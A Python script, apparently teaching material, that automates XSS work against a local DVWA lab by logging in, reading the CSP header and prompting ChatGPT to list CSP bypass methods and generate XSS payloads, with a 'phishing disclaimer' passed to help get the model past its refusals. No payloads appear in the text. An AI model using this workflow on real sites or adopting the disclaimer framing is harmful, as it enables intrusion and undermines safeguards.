"""
Identifying and Exploiting XSS Vulnerabilities with ChatGPT
Exploiting Advanced XSS Scenarios
['Use ChatGPT to develop exploitation techniques for advanced XSS scenarios, such as filter evasion and CSP bypass.', 'Apply ChatGPT to craft payloads that exploit XSS in non-traditional contexts (e.g., in SVGs, Markdown).', 'Utilize ChatGPT to simulate real-world attacks, improving understanding of XSS impact and defense strategies.', 'Develop with ChatGPT strategies for chaining XSS vulnerabilities with other exploit types to escalate attacks.']
This script is for for training purposes only
"""
import requests
import sys
import os
current_dir = os.path.dirname(os.path.abspath(__file__))
class_dir = os.path.join(current_dir, "..", "class")
sys.path.append(class_dir)
from dvwa_session import DVWA_Session
from chatgpt_func import ChatGPT_Func
from general_func import General_Func

class PointlessAI_exploiting_advanced_xss_scenarios(DVWA_Session, ChatGPT_Func, General_Func):
    def __init__(self):
        DVWA_Session.__init__(self)
        ChatGPT_Func.__init__(self)
        General_Func.__init__(self)

    def get_csp(self, url, s):
        response = s.get(url, headers=self.headers, proxies=self.proxies)
        csp = response.headers.get('Content-Security-Policy')
        if csp:
            print("Content Security Policy:", csp)
            return csp
        else:
            print("No Content Security Policy header found.")
            return 0      

    def analyse_csp(self, csp):
        prompt = f"Analyse the following content security policy: {csp} ."
        guidance = self.phishing_disclaimer
        analysis = self.red_team_query(prompt, guidance)
        print("CSP evasion payload:", analysis)
        return analysis
    
    def develop_exploitation_techniques(self, csp_analysis):
        prompt = f"The following is an analysis of a content security policy: {csp_analysis} . Return a json object with key csp_payloads that contains an array list of methods that can be used to bypass this csp when executing a javascript payload."
        analysis = self.json_query(prompt)
        print("CSP evasion payload:", analysis)
        return analysis
    
    def craft_advanced_payloads(self, csp_bypass_techniques, csp):
        prompt = f"Generate a javascript xss script that can be used to bypass the CSP: {csp} . The script should be based on the following csp bypass technique: {csp_bypass_techniques}"
        guidance = f"{self.no_markdown},{self.phishing_disclaimer}"
        for cbt in csp_bypass_techniques['csp_payloads']:
            print(cbt)
            payloads = self.red_team_query(prompt, guidance)
            print("Crafted payloads:", payloads)

    def chain_xss_with_other_exploits(self):
         # Use crafted payloads
        pass

def main():
    ai = PointlessAI_exploiting_advanced_xss_scenarios() # Instantiate class
    # Start session
    with requests.Session() as s:
        user_token, cookies = ai.get_csrf_token_and_cookie(s, ai.get_constants())
        _ = ai.login_to_dvwa(s, ai.get_constants(), 'admin', 'password', user_token)
        user_token, cookies = ai.get_csrf_token_and_cookie(s, ai.base_url+"/setup.php")
        _ = ai.setup_database(s, ai.base_url+"/setup.php", user_token, cookies)

        url = "http://127.0.0.1/vulnerabilities/csp/"

        # Analyse CSP and develop bypass
        csp = ai.get_csp(url, s)
        csp_analysis = ai.analyse_csp(csp)
        csp_bypass_techniques = ai.develop_exploitation_techniques(csp_analysis)
        payloads = ai.craft_advanced_payloads(csp_bypass_techniques, csp)

if __name__ == "__main__":
    main()